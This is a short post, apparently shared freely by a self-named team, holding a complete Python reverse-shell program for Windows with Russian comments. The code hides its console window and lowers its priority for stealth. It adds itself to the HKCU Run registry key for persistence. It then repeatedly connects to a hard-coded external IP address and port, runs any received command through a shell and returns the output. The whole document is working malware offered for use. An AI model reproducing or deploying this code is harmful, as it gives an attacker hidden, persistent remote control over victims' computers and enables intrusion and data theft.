different scripts like reverse-shell 

beaverV000 team bruh gyat

free 


script: 


import socket
import subprocess
import os
import sys
import time
import winreg
import ctypes
import select

def set_low_priority():
    """Снижает приоритет процесса до уровня IDLE (Windows)."""
    try:
        if os.name == 'nt':
            # Константа для низкого приоритета
            IDLE_PRIORITY_CLASS = 0x00000040
            handle = ctypes.windll.kernel32.GetCurrentProcess()
            ctypes.windll.kernel32.SetPriorityClass(handle, IDLE_PRIORITY_CLASS)
    except Exception:
        pass  # Подавляем ошибку для скрытности

def hide_console():
    """Скрывает окно консоли Windows."""
    try:
        if os.name == 'nt':
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                SW_HIDE = 0
                ctypes.windll.user32.ShowWindow(hwnd, SW_HIDE)
    except Exception:
        pass

def add_to_registry():
    """Добавляет скрипт в автозагрузку через реестр Windows (HKCU)."""
    try:
        file_path = os.path.abspath(sys.argv[0])
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS
        )
        app_name = "AdvancedShell"
        winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def execute_command(command):
    """Выполняет команду в системе и возвращает её вывод."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception:
        output = b"Execution error."
    return output.decode('utf-8', errors='replace')

def create_socket(server_ip, server_port):
    """Создаёт TCP-соединение с заданным сервером."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)  # Таймаут на установку соединения
    s.connect((server_ip, server_port))
    s.settimeout(None)  # Убираем таймаут после подключения
    return s

def reverse_shell(server_ip, server_port):
    """
    Основной цикл обратного шелла с использованием select для минимальной нагрузки.
    При отсутствии входящих данных цикл делает небольшую задержку.
    """
    while True:
        sock = None
        try:
            sock = create_socket(server_ip, server_port)
            sock.sendall(b"[+] Connection established.\n")
            while True:
                # Использование select для ожидания активности на сокете (таймаут 1 секунда)
                ready, _, _ = select.select([sock], [], [], 1)
                if ready:
                    data = sock.recv(1024)
                    if not data:
                        break  # Соединение закрыто
                    command = data.decode('utf-8', errors='replace').strip()
                    if command.lower() == "exit":
                        sock.sendall(b"[+] Disconnecting.\n")
                        sock.close()
                        sys.exit(0)
                    elif command:
                        result = execute_command(command)
                        if not result:
                            result = "[+] Command executed with no output.\n"
                        sock.sendall(result.encode('utf-8'))
                # Небольшая задержка для уменьшения ЦПУ-алгоритмов
                time.sleep(0.1)
        except Exception:
            # Если соединение не установлено – делаем паузу, чтобы не нагружать систему
            time.sleep(5)
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

if __name__ == "__main__":
    # Применяем меры для повышения скрытности и снижения нагрузки
    hide_console()       # Скрываем окно консоли
    set_low_priority()   # Снижаем приоритет процесса
    add_to_registry()    # Добавляем скрипт в автозагрузку

    # Замените на IP и порт управляющего ПК.
    SERVER_IP = "5.199.233.23"  # Публичный или локальный IP, в зависимости от настроек сети
    SERVER_PORT = 1488          # Порт, который слушает управляющий (например, ncat)

    reverse_shell(SERVER_IP, SERVER_PORT)
